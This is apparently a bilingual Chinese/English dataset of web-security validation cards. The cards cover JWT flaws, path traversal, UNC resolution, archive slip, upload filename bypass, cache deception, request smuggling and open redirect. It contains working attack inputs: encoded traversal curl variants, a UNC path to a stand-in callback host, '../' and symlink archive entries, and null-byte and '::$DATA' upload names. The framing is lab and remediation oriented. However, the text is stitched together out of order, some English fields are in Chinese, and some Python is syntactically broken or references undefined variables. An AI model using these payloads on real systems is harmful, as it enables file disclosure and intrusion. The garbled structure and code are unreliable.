overview.en: JWT is a token format whose security depends on verifier-fixed algorithms and key sources plus issuer, audience, time, and purpose checks. Decoding and offline secret audits are tools; none, algorithm confusion, kid, and jku or jwk are different trust boundaries.

vulnerability.zh: 根因包括从令牌 alg 动态选择未允许算法、混用 HMAC 与非对称密钥、弱 HMAC secret、把 kid 拼进 SQL/路径、信任任意 jku/jwk，以及未校验 iss、aud、exp、nbf 或 token type。每类都需单独验证。
vulnerability.en: Root causes include selecting unapproved algorithms from token alg, confusing HMAC and asymmetric keys, weak HMAC secrets, concatenating kid into SQL or paths, trusting arbitrary jku or jwk, and omitting iss, aud, exp, nbf, or token-type checks. Validate each separately.

exploitation.zh: 先用测试 issuer 签发一个短期正常令牌并访问标记 API，再一次只改变签名算法、密钥来源、kid 或一个 claim。离线工具只处理自建令牌；服务端测试以主体、验证库日志、选中 key ID 和资源授权日志共同确认。
exploitation.en: Issue one short-lived valid token from the test issuer and access the marker API, then change only algorithm, key source, kid, or one claim. Offline tools process only self-created tokens; server tests correlate principal, verifier logs, selected key ID, and resource authorization logs.

mitigation.zh: 在服务器配置中固定允许算法和每种 token type 的验证规则，隔离 HMAC 与非对称密钥，使用高熵 secret；kid 仅作允许列表键，远程 JWKS 固定 issuer、HTTPS 主机和 key 属性，并严格校验 iss、aud、时间与用途。
mitigation.en: Fix allowed algorithms and validation rules per token type in server configuration, separate HMAC and asymmetric keys, use high-entropy secrets, treat kid only as an allowlisted lookup key, pin remote JWKS to issuer, HTTPS host, and key properties, and strictly validate iss, aud, time, and purpose.

name.zh: JWT Claim 与嵌套令牌验证
name.en: JWT Claim and Nested Token Validation

description.zh: 将原混合集中的命令隔离为JWT Claim 与嵌套令牌验证验证卡，使用合成主体、只读标记和服务端证据界定结果。
description.en: 将原混合集中的命令隔离为JWT Claim 与嵌套令牌验证验证卡，使用合成主体、只读标记和服务端证据界定结果。

subCategory.zh: JWT Claim 与嵌套令牌验证
subCategory.en: JWT Claim and Nested Token Validation

prerequisites.zh: 使用自有 issuer、测试签名密钥、两个合成主体和只读标记 API，记录库版本、允许算法、kid resolver 与 JWKS 配置。
prerequisites.en: Use an owned issuer, test signing keys, two synthetic principals, and a read-only marker API, recording library version, allowed algorithms, kid resolver, and JWKS configuration.

prerequisites.zh: 每个测试令牌具有唯一 jti、短期 exp、固定 iss/aud，弱密钥检查仅对自有离线样本执行。
prerequisites.en: Every test token has a unique jti, short exp, and fixed iss and aud; weak-secret checks run only against owned offline samples.

title.zh: JWT Claim 与嵌套令牌验证样例 1
title.en: JWT Claim and Nested Token Validation Sample 1

description.zh: 在隔离环境使用合成主体执行该JWT Claim 与嵌套令牌验证样例，并以服务端日志和只读标记确认结果。
description.en: Run this JWT Claim and Nested Token Validation sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

analysis.zh: 阳性要求服务端接受未签名、错误算法、攻击者控制密钥来源或错误 issuer/audience 的测试令牌，并以错误主体读取同一标记资源。解码 payload、生成令牌、hashcat 找到自建弱密钥、JWKS 可访问、kid 字符串被解析、库抛错或令牌仅被网关回显都不是验证绕过。
analysis.en: Positive evidence requires the server to accept an unsigned token, wrong algorithm, attacker-controlled key source, or wrong issuer or audience and read the same marker as the wrong principal. Decoding a payload, generating a token, finding an intentionally weak local secret, reaching JWKS, parsing a kid string, library errors, or gateway reflection are not validation bypass.

opsecTips.zh: 仅使用测试密钥和低权限 claim；不得破解真实令牌密钥、读取管理员 API、托管恶意公网 JWKS 或复用生产证书。
opsecTips.en: Use only test keys and low-privilege claims; do not crack real token secrets, access administrator APIs, host malicious public JWKS, or reuse production certificates.

opsecTips.zh: 撤销所有测试 jti 和密钥，删除令牌、字典、JWKS 与工具输出，清理 issuer/resource-server 缓存。
opsecTips.en: Revoke all test jtis and keys, delete tokens, wordlists, JWKS, and tool output, and clear issuer and resource-server caches.

title.zh: 建立安全基线

description.zh: 为JWT Claim 与嵌套令牌验证准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for JWT Claim and Nested Token Validation.

title.zh: 提交单变量样例

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

title.zh: 关联服务端证据

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

title.zh: 清理并回归

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

name.zh: 文件下载路径规范化差异

description.zh: 文件下载路径规范化差异将旧集合限定为单一验证边界：下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: File Download Path Normalization Differential narrows the legacy collection to one boundary: the download parameter is interpreted inconsistently across URL decoding, separator folding, and root confinement. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 文件下载路径规范化差异

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 文件下载路径规范化差异验证块 1
title.en: File Download Path Normalization Differential Validation Block 1

execution.command:
BASE="http://127.0.0.1:8080/download?file="
curl --fail --silent --show-error --max-time 3 "${BASE}../outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}....//outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}..%5coutside%5cPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../documents/PAYLOADER_MARKER.txt"

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

title.zh: 文件下载路径规范化差异验证块 2
title.en: File Download Path Normalization Differential Validation Block 2

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

analysis.zh: 确认标准是最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

title.zh: 确认处理边界

description.zh: 定位与文件下载路径规范化差异有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for File Download Path Normalization Differential, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.zh: 提交无变体的 PAYLOADER_MARKER，记录提交值、最终对象名、解析结果和清理位置。
description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

title.zh: 提交单一边界变体

description.zh: 一次只运行一个文件下载路径规范化差异命令块，保留原始请求、响应和服务端日志。
description.en: Run one File Download Path Normalization Differential command block at a time and preserve the raw request, response, and server logs.

attackChain.payload:
BASE="http://127.0.0.1:8080/download?file="
curl --fail --silent --show-error --max-time 3 "${BASE}../outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}....//outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}..%5coutside%5cPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../documents/PAYLOADER_MARKER.txt"

title.zh: 关联最终证据

description.zh: 最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

title.zh: 修复并双向回归

description.zh: 使用服务端对象标识，统一解码和规范化，并在打开文件前强制执行根目录与 scheme 允许列表，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: use server-issued object identifiers, canonicalize once, and enforce root and scheme allowlists before opening a file, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

overview.zh: 文件下载路径规范化差异比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: File Download Path Normalization Differential compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that the download parameter is interpreted inconsistently across URL decoding, separator folding, and root confinement. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应使用服务端对象标识，统一解码和规范化，并在打开文件前强制执行根目录与 scheme 允许列表。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should use server-issued object identifiers, canonicalize once, and enforce root and scheme allowlists before opening a file. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

title.zh: 提交单一边界变体

description.zh: 一次只运行一个UNC 路径解析边界命令块，保留原始请求、响应和服务端日志。
description.en: Run one UNC Path Resolution Boundary command block at a time and preserve the raw request, response, and server logs.

attackChain.payload: curl --fail --silent --show-error --max-time 3 "${BASE}%5c%5ccallback.example.invalid%5cpayloader%5cPAYLOADER_MARKER.txt"

title.zh: 关联最终证据

description.zh: 批准根目录外的唯一 marker 被读取，且规范路径或网络解析日志与请求 ID 精确关联，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that the unique marker outside the approved root is read and canonical-path or network-resolution logs correlate exactly with the request ID, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

title.zh: 修复并双向回归

description.zh: 拒绝绝对、设备和父目录形式，通过受限目录句柄访问文件，并在最终路径上执行边界检查，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: reject absolute, device, and parent forms, access files through a confined directory handle, and enforce boundaries on the final path, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

overview.zh: UNC 路径解析边界比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: UNC Path Resolution Boundary compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是应用把用户路径传给支持 UNC 的 Windows API 并触发网络解析。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that the application passes a user path to a Windows API that accepts UNC and triggers network resolution. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是批准根目录外的唯一 marker 被读取，且规范路径或网络解析日志与请求 ID 精确关联；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that the unique marker outside the approved root is read and canonical-path or network-resolution logs correlate exactly with the request ID; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应拒绝绝对、设备和父目录形式，通过受限目录句柄访问文件，并在最终路径上执行边界检查。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should reject absolute, device, and parent forms, access files through a confined directory handle, and enforce boundaries on the final path. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

name.zh: 路径遍历旧式终止与截断

description.zh: 路径遍历旧式终止与截断将旧集合限定为单一验证边界：终止字节、短名和路径填充在旧式解析链上改变最终文件名。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: Path-Traversal Legacy Termination and Truncation narrows the legacy collection to one boundary: terminator bytes, short names, and path padding alter the final filename in a legacy parsing chain. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 路径遍历旧式终止与截断

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 路径遍历旧式终止与截断验证块 1
title.en: Path-Traversal Legacy Termination and Truncation Validation Block 1

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

analysis.zh: 确认标准是字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for Path-Traversal Legacy Termination and Truncation, and enable request-ID correlation.

title.zh: 归档成员路径规范化验证块 1

execution.command:
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
archive = root / "path-traversal.zip"
with zipfile.ZipFile(archive, "w") as output:
    output.writestr("readme.txt", "PAYLOADER_SAFE_CONTROL")
    output.writestr("../outside/PAYLOADER_MARKER.txt", "PAYLOADER_MARKER")
with zipfile.ZipFile(archive, "r") as input_archive:
    for info in input_archive.infolist():
        print(info.filename, info.file_size)

import stat
import tarfile
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
target = "../outside/PAYLOADER_MARKER.txt"
with tarfile.open(root / "symlink.tar.gz", "w:gz") as archive:

    info.type = tarfile.SYMTYPE
    info.linkname = target
    archive.addfile(info)
with zipfile.ZipFile(root / "symlink.zip", "w") as archive:
    info = zipfile.ZipInfo("marker-link")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    archive.writestr(info, target)
print(target)

execution.command:
import tempfile
from pathlib import Path

fixtures = {
    "marker.jpg": bytes.fromhex("FFD8FFE000104A464946") + b"PAYLOADER_MARKER",
    "marker.png": bytes.fromhex("89504E470D0A1A0A") + b"PAYLOADER_MARKER",
    "marker.gif": b"GIF89aPAYLOADER_MARKER",
    "marker.bmp": b"BM" + (54).to_bytes(4, "little") + b"\x00" * 48 + b"PAYLOADER_MARKER",
}
with tempfile.TemporaryDirectory(prefix="payloader-signature-") as directory:
    root = Path(directory)
    for name, data in fixtures.items():
        path = root / name
        path.write_bytes(data)
        assert path.read_bytes().endswith(b"PAYLOADER_MARKER")
        print(name, len(data), data[:12].hex())

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。

analysis.zh: 确认标准是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。

HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

execution.command:
import socket

host, port = "127.0.0.1", 8080
boundary = "PAYLOADER_BOUNDARY"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="file"; filename="PAYLOADER_MARKER.txt"\r\n'
    "Content-Type: text/plain\r\n\r\n"
    f"PAYLOADER_MARKER\r\n--{boundary}--\r\n"
).encode("ascii")
request = (
    "POST /upload HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n\r\n"
).encode("ascii") + body
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(request)
    print(sock.recv(4096).decode("latin-1", errors="replace"))

execution.command:
import socket

host, port = "127.0.0.1", 8080
boundary = b"PAYLOADER_BOUNDARY"
filename = b"PAYLOADER_MARKER.txt\x00.jpg"
body = b"--" + boundary + b"
Content-Disposition: form-data; name="file"; filename="" + filename + b""
Content-Type: text/plain

PAYLOADER_MARKER
--" + boundary + b"--
"
request = b"POST /upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=" + boundary + b"
Content-Length: " + str(len(body)).encode("ascii") + b"
Connection: close

" + body
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(request)
    print(sock.recv(4096).decode("latin-1", errors="replace"))

import tempfile
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"
names = [
    "PAYLOADER_MARKER.txt.",
    "PAYLOADER_MARKER.txt ",
    "PAYLOADER_MARKER.txt::$DATA",
    "PAYLOADER_MARKER.TXT",
    "PAYLOADER_MARKER.txt" + "/./" * 64,
]
with tempfile.TemporaryDirectory(prefix="payloader-name-") as directory:
    marker = Path(directory) / "PAYLOADER_MARKER.txt"
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    for name in names:
        with marker.open("rb") as handle:
            response = requests.post(f"{BASE}/upload", files={"file": (name, handle, "text/plain")}, timeout=3)
        print(repr(name), response.status_code)

overview.zh: Web 缓存私有响应隔离验证聚焦以下边界：使用专用账号和不含隐私的标记响应，验证路径解析差异是否导致认证页面被共享缓存。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Web Cache Private-Response Isolation Validation focuses on this boundary: Uses a dedicated account and privacy-free marker response to test whether path parsing differences cause an authenticated page to enter a shared cache. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自缓存键和源站响应变体不一致，或缓存层与应用对路径、认证和私有响应的解释不同。单次 X-Cache、Age 或响应变化只能说明缓存行为，只有无会话客户端收到同一标记或私有变体时才构成跨用户影响。
vulnerability.en: Risk arises when cache keys omit origin response variants or when the cache and application disagree on paths, authentication, or private responses. One X-Cache, Age, or response change shows caching behavior only; cross-user impact requires a no-session client to receive the same marker or private variant.

exploitation.zh: 为专用测试路由生成唯一 PAYLOADER_CACHE 标记，按 miss、hit、不同会话和无会话顺序请求，并保存 Cache-Control、Vary、Age、缓存键日志和响应哈希。使用不含隐私的固定正文，发现共享污染后立即 purge，禁止影响真实用户。
exploitation.en: Generate a unique PAYLOADER_CACHE marker for a dedicated test route and request it in miss, hit, different-session, and no-session order, preserving Cache-Control, Vary, Age, cache-key logs, and response hashes. Use a privacy-free fixed body, purge immediately on shared contamination, and do not affect real users.

mitigation.zh: 让缓存键覆盖所有影响响应的已规范化输入，拒绝未批准的转发头，对认证和个性化响应设置 private/no-store 并正确使用 Vary。统一 CDN 与源站路径规范化，限制可缓存状态和扩展名，部署后 purge 旧对象并重复多会话回归。
mitigation.en: Include every normalized input that affects the response in the cache key, reject unapproved forwarding headers, mark authenticated and personalized responses private or no-store, and use Vary correctly. Align CDN and origin path normalization, constrain cacheable statuses and extensions, purge old objects after deployment, and repeat multi-session regression.

overview.zh: HTTP 重复 Content-Length 拒绝回归聚焦以下边界：依据 RFC 9112 验证不同 Content-Length 值是否被整条代理链拒绝，不尝试访问管理路径。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: HTTP Duplicate Content-Length Rejection Regression focuses on this boundary: Uses RFC 9112 expectations to verify that differing Content-Length values are rejected across the proxy chain without targeting an administrative path. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 请求走私来自同一持久连接上的两个 HTTP 组件对消息长度或字段规范化得出不同边界。RFC 9112 要求 Transfer-Encoding 覆盖 Content-Length，并要求拒绝不可恢复的歧义；一个 curl 状态码、服务器类型或单端超时不能证明前后端不同步。
vulnerability.en: Request smuggling arises when two HTTP components on one persistent connection derive different message boundaries from length or field normalization. RFC 9112 makes Transfer-Encoding override Content-Length and requires rejection of unrecoverable ambiguity; one curl status, server type, or single-hop timeout does not prove desynchronization.

exploitation.zh: 只在单用户实验代理链向 echo 后端发送一个 PAYLOADER_SMUGGLE 标记歧义请求，记录前端、后端和连接级日志以及请求计数。阳性必须证明一个输入在两端被分成不同数量或长度的请求；不发送管理路径，不等待或影响下一位用户请求。
exploitation.en: Send one PAYLOADER_SMUGGLE ambiguity marker only through a single-user lab proxy chain to an echo backend, recording front-end, backend, connection logs, and request counts. A positive result must prove that one input became a different request count or length at the two hops; do not target administrative paths or wait for another user request.

mitigation.zh: 在边缘统一使用严格 HTTP 解析，拒绝重复或冲突的长度字段、非法 Transfer-Encoding 和含糊空白，避免不安全的协议降级，并在转发前重建规范请求。升级所有代理和服务器，修复后重放正常请求与每个歧义阴性样例。
mitigation.en: Use strict HTTP parsing at the edge; reject duplicate or conflicting length fields, invalid Transfer-Encoding, and ambiguous whitespace; avoid unsafe protocol downgrades; and reconstruct canonical requests before forwarding. overview.zh: HTTP TE-CL 消息边界回归聚焦以下边界：在隔离 echo 后端比较前后端消息长度判断，并用唯一标记识别是否出现多余请求。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: HTTP TE-CL Message-Boundary Regression focuses on this boundary: Compares message-length decisions at a lab front end and echo backend and uses a unique marker to identify any extra request. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 请求走私来自同一持久连接上的两个 HTTP 组件对消息长度或字段规范化得出不同边界。RFC 9112 要求 Transfer-Encoding 覆盖 Content-Length，并要求拒绝不可恢复的歧义；一个 curl 状态码、服务器类型或单端超时不能证明前后端不同步。
vulnerability.en: Request smuggling arises when two HTTP components on one persistent connection derive different message boundaries from length or field normalization. RFC 9112 makes Transfer-Encoding override Content-Length and requires rejection of unrecoverable ambiguity; one curl status, server type, or single-hop timeout does not prove desynchronization.

exploitation.zh: 只在单用户实验代理链向 echo 后端发送一个 PAYLOADER_SMUGGLE 标记歧义请求，记录前端、后端和连接级日志以及请求计数。阳性必须证明一个输入在两端被分成不同数量或长度的请求；不发送管理路径，不等待或影响下一位用户请求。
exploitation.en: Send one PAYLOADER_SMUGGLE ambiguity marker only through a single-user lab proxy chain to an echo backend, recording front-end, backend, connection logs, and request counts. A positive result must prove that one input became a different request count or length at the two hops; do not target administrative paths or wait for another user request.

mitigation.zh: 在边缘统一使用严格 HTTP 解析，拒绝重复或冲突的长度字段、非法 Transfer-Encoding 和含糊空白，避免不安全的协议降级，并在转发前重建规范请求。升级所有代理和服务器，修复后重放正常请求与每个歧义阴性样例。
mitigation.en: Use strict HTTP parsing at the edge; reject duplicate or conflicting length fields, invalid Transfer-Encoding, and ambiguous whitespace; avoid unsafe protocol downgrades; and reconstruct canonical requests before forwarding. Upgrade every proxy and server, then replay normal requests and every ambiguity negative case.

title.zh: 关联 HTTP 重复 Transfer-Encoding 回归 的服务端证据
title.en: 关联 HTTP 重复 Transfer-Encoding 回归 的服务端证据

description.zh: 把唯一标记与解析器、代理、应用、数据库或浏览器证据按时间关联，并排除回显、缓存、重试、客户端修改和统一错误页。
description.en: Correlate the unique marker over time with parser, proxy, application, database, or browser evidence while excluding reflection, caching, retries, client modification, and generic error pages.

title.zh: 修复 HTTP 重复 Transfer-Encoding 回归 并重放基线
title.en: Remediate HTTP Duplicate Transfer-Encoding Regression and Replay the Baseline

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: HTTP 重复 Transfer-Encoding 回归聚焦以下边界：验证多个或非法 Transfer-Encoding 是否在规范化前被拒绝，不维护针对具体产品的混淆清单。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: HTTP Duplicate Transfer-Encoding Regression focuses on this boundary: Tests whether multiple or invalid Transfer-Encoding values are rejected before normalization without maintaining product-specific obfuscation lists. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 请求走私来自同一持久连接上的两个 HTTP 组件对消息长度或字段规范化得出不同边界。RFC 9112 要求 Transfer-Encoding 覆盖 Content-Length，并要求拒绝不可恢复的歧义；一个 curl 状态码、服务器类型或单端超时不能证明前后端不同步。
vulnerability.en: Request smuggling arises when two HTTP components on one persistent connection derive different message boundaries from length or field normalization. RFC 9112 makes Transfer-Encoding override Content-Length and requires rejection of unrecoverable ambiguity; one curl status, server type, or single-hop timeout does not prove desynchronization.

exploitation.zh: 只在单用户实验代理链向 echo 后端发送一个 PAYLOADER_SMUGGLE 标记歧义请求，记录前端、后端和连接级日志以及请求计数。阳性必须证明一个输入在两端被分成不同数量或长度的请求；不发送管理路径，不等待或影响下一位用户请求。
exploitation.en: Send one PAYLOADER_SMUGGLE ambiguity marker only through a single-user lab proxy chain to an echo backend, recording front-end, backend, connection logs, and request counts. A positive result must prove that one input became a different request count or length at the two hops; do not target administrative paths or wait for another user request.

mitigation.zh: 在边缘统一使用严格 HTTP 解析，拒绝重复或冲突的长度字段、非法 Transfer-Encoding 和含糊空白，避免不安全的协议降级，并在转发前重建规范请求。升级所有代理和服务器，修复后重放正常请求与每个歧义阴性样例。
mitigation.en: Use strict HTTP parsing at the edge; reject duplicate or conflicting length fields, invalid Transfer-Encoding, and ambiguous whitespace; avoid unsafe protocol downgrades; and reconstruct canonical requests before forwarding. Upgrade every proxy and server, then replay normal requests and every ambiguity negative case.

name.zh: 开放重定向解析差异样例

description.en: Use reserved domains and a local redirect fixture to validate parsing differences involving encoding, userinfo, backslashes, protocol-relative URLs, fragments, and double-decoded CRLF.

prerequisites.zh: 使用 127.0.0.1 重定向 Fixture，并让 redirect-canary.invalid 只作为不可解析的保留测试域名。

prerequisites.en: Record the server input, normalized value, Location header, and browser destination without automatically following external redirects.

analysis.zh: 只有响应 Location 或浏览器最终地址的规范化 host 为未批准域名时才确认问题。输入字符串含外域、服务端返回 3xx、或校验日志出现告警都不足以证明可利用，必须核对最终解析结果。
analysis.en: Confirm only when the normalized host in Location or the browser destination is unapproved. An external-looking input, a 3xx response, or a validation warning alone does not prove exploitability; the final parsed destination must be checked.

opsecTips.zh: 使用 `.invalid` 保留域名并关闭自动跟随，避免任何样例访问真实第三方站点。
opsecTips.en: Use the reserved .invalid domain and disable automatic following so no sample reaches a real third-party site.

opsecTips.en: Change one URL component per request and preserve raw bytes and decode counts to avoid mistaking proxy or browser rewriting for application behavior.

title.zh: 比较规范化与最终目标

description.zh: 对照原始输入、服务端解析结果、Location 与浏览器地址栏，定位发生分歧的阶段。
description.en: Compare raw input, server parsing, Location, and the browser address bar to identify the stage where interpretation diverges.

title.zh: 验证允许列表修复

description.zh: 修复后重复全部样例，要求外部保留域名被拒绝或被规范化为批准的同源路径。
description.en: Repeat every sample after remediation and require the reserved external domain to be rejected or normalized to an approved same-origin path.

